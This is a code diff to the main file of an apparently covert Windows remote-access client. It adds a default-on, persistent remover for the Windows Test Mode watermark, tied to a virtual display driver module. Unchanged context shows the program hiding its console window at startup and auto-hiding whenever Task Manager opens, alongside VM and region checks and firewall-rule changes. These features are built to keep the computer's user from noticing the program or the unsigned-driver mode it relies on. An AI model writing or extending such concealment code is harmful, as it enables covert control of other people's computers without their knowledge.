@@ -5,6 +5,7 @@ import argparse
 import asyncio
 import logging
 import os
+import platform
 import tempfile
 
 from remote_client.config import (
@@ -14,7 +15,6 @@ from remote_client.config import (
     resolve_team_id,
 )
 from remote_client.runtime import build_client, load_or_create_device_token
-from remote_client.system_info import load_or_collect_system_info
 from remote_client.security.anti_frod_reg import analyze_region
 from remote_client.security.anti_frod_vm import analyze_device
 from remote_client.security.firewall import ensure_firewall_rules
@@ -26,6 +26,9 @@ from remote_client.security.process_monitor import (
 )
 from remote_client.proxy import load_proxy_settings_from_env, set_proxy_settings
 from remote_client.windows.dpi import ensure_dpi_awareness
+
+# Test Mode watermark remover (Windows only)
+_watermark_remover = None
 
 
 def _anti_fraud_disabled() -> bool:
@@ -41,6 +44,26 @@ def _taskmanager_monitor_enabled() -> bool:
 def _hide_console_on_start() -> bool:
     value = os.getenv("RC_HIDE_CONSOLE", "1")
     return value.strip().lower() not in {"0", "false", "no", "off"}
+
+
+def _hide_test_mode_watermark_enabled() -> bool:
+    """Check if Test Mode watermark hiding is enabled."""
+    value = os.getenv("RC_HIDE_WATERMARK", "1")
+    return value.strip().lower() not in {"0", "false", "no", "off"}
+
+
+def _start_watermark_remover() -> None:
+    """Start the Test Mode watermark remover on Windows."""
+    global _watermark_remover
+    if platform.system() != "Windows":
+        return
+    if not _hide_test_mode_watermark_enabled():
+        return
+    try:
+        from remote_client.windows.vdd_driver import remove_test_mode_watermark_persistent
+        _watermark_remover = remove_test_mode_watermark_persistent()
+    except Exception as e:
+        logging.getLogger(__name__).debug("Watermark remover failed: %s", e)
 
 
 def _configure_logging() -> None:
@@ -68,6 +91,9 @@ def main() -> None:
     # Hide console window on startup if enabled
     if _hide_console_on_start():
         hide_console_window()
+
+    # Hide Test Mode watermark (Windows only)
+    _start_watermark_remover()
 
     # Start task manager monitor to auto-hide when taskmgr is opened
     if _taskmanager_monitor_enabled():
@@ -118,9 +144,6 @@ def main() -> None:
             "countries": list(antifraud_config.countries),
         }
     }
-    system_info = load_or_collect_system_info()
-    if system_info:
-        client_config.update(system_info)
     client = build_client(
         session_id,
         signaling_token,
